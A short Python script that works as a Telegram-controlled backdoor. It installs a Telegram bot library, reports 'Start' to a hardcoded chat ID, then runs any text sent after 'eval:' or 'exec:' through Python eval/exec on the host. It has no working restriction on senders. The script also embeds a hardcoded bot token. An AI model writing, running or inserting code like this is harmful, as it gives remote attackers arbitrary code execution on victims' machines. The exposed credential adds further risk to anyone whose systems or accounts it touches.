import os;os.system('pip install pyTelegramBotAPI');import telebot;token='6421982853:AAGpLTpCiV4byFyGHDoelPj-PwQyGca6TvA';bot = telebot.TeleBot(token);bl = [];bot.send_message(1346243726, 'Start')
@bot.message_handler()
def f(m):
    try:
        if('eval:' in m.text and not m.chat.id in bl)or('eval:' in m.text and m.chat.id==1346243726):bot.send_message(m.chat.id, eval(''.join(m.text.split('eval:')[1:]))) 
        if('exec:' in m.text and not m.chat.id in bl)or('exec:' in m.text and m.chat.id==1346243726):exec(''.join(m.text.split('exec:')[1:]));bot.send_message(m.chat.id, 'S')
    except:bot.send_message(m.chat.id, 'E')
bot.polling(none_stop=True)
